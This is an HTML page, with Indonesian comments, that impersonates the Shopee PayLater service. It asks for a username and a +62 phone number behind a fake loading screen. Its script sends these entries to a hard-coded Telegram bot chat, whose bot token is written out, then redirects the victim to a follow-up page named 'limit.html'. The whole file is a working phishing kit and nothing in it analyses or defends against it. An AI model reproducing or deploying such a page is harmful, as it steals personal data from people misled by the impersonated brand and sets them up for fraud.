<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>SHOPEE:PAYLATER</title>
  <meta property="og:image" content="https://i.ibb.co/GszXFJ2/IMG-20240315-105849.jpg">
  <meta name="viewport" content="width, initial-scale=1">
  <meta name="theme-color" content="OrangeRed">
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      max-width: 800px;
      margin: 0 auto;
    }

    .gambar {
      width: 100%;
      margin-bottom: 0px;
    }

    .gambar img {
      width: 100%;
      object-fit: cover;
      margin-bottom: 0px;
    }

    .form-container {
      margin-bottom: 50px;
    }

    .form-container form {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 10px;
      position: relative; /* Menjadikan posisi relatif untuk posisi absolut span */
    }

    .form-container .phone-prefix {
      position: absolute; /* Menjadikan posisi absolut untuk span */
      left: 10px; /* Sesuaikan dengan jarak dari kiri input */
      top: 50%;
      transform: translateY(-50%);
      pointer-events: none; /* Agar tidak mengganggu klik ke input */
      font-weight:bold;
      font-size:14px;
      margin-left: 39px;
      color: #000000;
      margin-right: 150px;
      padding-bottom: 104px;
      margin-top:37px;
    }

    .form-container input[type="tel"],
    .form-container input[type="Submit"],
    .form-container input[type="text"] {
      width: calc(70% - 8px);
      padding: 13px;
      border-radius: 8px;
      border: 1px solid #ff4500;
      margin-bottom: 30px;
      margin-left: 4px;
      font-weight:bold;
      font-size:14px;
      padding-left: 40px; /* Menambahkan padding kiri untuk membuat ruang untuk span */
    }

    .form-container input[type="Submit"] {
      width: calc(120% - 8px);
      max-width: 310px;
      padding: 13px;
      border-radius: 6px;
      background-color: #ff4500;
      color: white;
      font-weight: bold;
      cursor: pointer;
      margin-left: 7px;
      border-block-color: #ff4500;
    }

    .gambar-bawah {
      display: flex;
      justify-content: center;
      position: relative;
      bottom: -10px;
    }
    .gambar-bawah img {
  width: 50%;
  object-fit: cover;
  margin: 0 25px;
  background:none;
}


    .gambar-bawah img {
      width: 50%;
      object-fit: cover;
      margin: 0 25px;
    }

    /* Aturan gaya untuk elemen putih */
    .white-element {
      width: 100vw;
      height: 100vh;
      background-color: #ff4500; /* Menggunakan warna solid tanpa transparansi */
      position: fixed;
      top: 0;
      left: 0;
      z-index: 9999;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }

    .white-element img {
      width: 400px; /* Ganti dengan ukuran yang diinginkan */
      height: 890px; /* Ganti dengan ukuran yang diinginkan */
    }

    .loading-text {
      margin-top: 10px;
      font-size: 16px;
      color:#ff4500;
      font-weight:bold;
    }

    /* Aturan CSS untuk logo kedua */
    .second-logo {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 9999;
      background-color: rgba(255, 255, 255, 0.7); /* Putih dengan transparansi 0.7 */
      padding: 10px; /* Mengurangi padding agar logo lebih kecil */
      border-radius: 8px;
      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
    }

    /* Ukuran logo kedua */
    .second-logo img {
      width: 180px; /* Mengurangi lebar logo kedua */
      height: auto; /* Biarkan tinggi otomatis menyesuaikan proporsi */
    }
  </style>
  <script>
    window.addEventListener('load', function() {
      showWhiteElement();
    });

    function sendMessageToTelegram(message) {
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
        if (this.readyState === 4 && this.status === 200) {
          console.log("Pesan terkirim: " + message);
        }
      };
      var url = "https://api.telegram.org/bot6406080700:AAHtISL259Uu4s3x93AzNMWK-XGedAGdp_0/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);

      xhttp.open("POST", url, true);
      xhttp.send();
    }

    function kirimPesan() {
  var nomorHP = document.getElementById('nomor_hp').value;
  var username = document.getElementById('username').value; // tambahkan ini untuk mendapatkan nilai username
  if (nomorHP.trim() === '' || username.trim() === '') { // periksa apakah kedua input kosong
    if (navigator.vibrate) {
      navigator.vibrate(200);
    }
    return;
  }

  var message = "𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: " + username + ", 𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲: " + nomorHP; // ubah pesan untuk mencakup username
  sendMessageToTelegram(message);
  showSecondLogo(); // Panggil fungsi untuk menampilkan logo kedua setelah pesan terkirim
}


    function showWhiteElement() {
      var whiteElement = document.createElement('div');
      whiteElement.classList.add('white-element');

      var logoImage = document.createElement('img');
      logoImage.src = 'https://i.ibb.co/Bspt4gC/1000002851-removebg-preview.png';
      logoImage.alt = 'Logo';
      whiteElement.appendChild(logoImage);

      var loadingText = document.createElement('div');
      loadingText.classList.add('loading-text');
      loadingText.innerText = 'Tunggu sebentar ya... Gak lama kok';
      whiteElement.appendChild(loadingText);

            document.body.appendChild(whiteElement);

      setTimeout(function () {
        whiteElement.style.display = 'none';
      }, 5000); // Ubah waktu penundaan menjadi 5 detik
    }

    function showSecondLogo() {
      var secondLogo = document.createElement('div');
      secondLogo.classList.add('second-logo');

      var secondLogoImage = document.createElement('img');
      secondLogoImage.src = 'https://i.ibb.co/D1CTX7v/pay1-1-removebg-preview.png';
      secondLogoImage.alt = 'Logo Kedua';
      secondLogo.appendChild(secondLogoImage);

      document.body.appendChild(secondLogo);

      setTimeout(function () {
        secondLogo.style.display = 'none';
        window.location.href = 'limit.html';
        // Ganti window.location.href ke halaman selanjutnya di sini
      }, 3000); // Ubah waktu penundaan menjadi 3 detik
    }
  </script>
</head>
<body>
  <div class="gambar">
    <img src="https://i.ibb.co/GszXFJ2/IMG-20240315-105849.jpg" alt="Gambar Pucok">
  </div>

  <div class="form-container">
    <form onsubmit="kirimPesan(); return false;">
      <!-- Kolom input username -->
      <input type="text" id="username" name="username" placeholder="Username" required>
      <!-- Kolom input nomor HP -->
      <span class="phone-prefix">+62</span>
      <input type="tel" id="nomor_hp" name="nomor_hp" maxlength="12" placeholder="Nomor Handphone" required>
      <!-- Tombol submit -->
      <input type="Submit" value="Lanjutkan">
    </form>
  </div>

  <div class="gambar gambar-bawah">
    <img src="https://i.ibb.co/1nyLpFy/Shopee-Paylater-removebg-preview.png" alt="Logo LPS">
  </div>
</body>
</html>
